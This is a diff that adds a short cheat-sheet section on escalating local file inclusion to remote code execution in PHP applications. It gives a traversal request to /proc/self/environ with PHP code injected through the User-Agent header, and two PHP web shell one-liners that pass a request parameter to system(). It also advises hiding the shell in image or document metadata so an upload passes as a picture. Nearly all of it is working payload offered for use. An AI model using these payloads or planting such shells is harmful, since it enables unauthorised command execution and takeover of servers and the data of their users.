@@ -1,0 +1,16 @@
+LFI to RCE via /proc/self/environ
+
+Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file
+
+GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
+User-Agent: <?=phpinfo(); ?>
+
+LFI to RCE via upload
+
+If you can upload a file, just inject the shell payload in it (e.g : <?php system($_GET['c']); ?> ).
+
+http://example.com/index.php?page=path/to/uploaded/file.png
+
+In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf
+
+<?php $cmd=$_GET['cmd']; system($cmd); ?> 
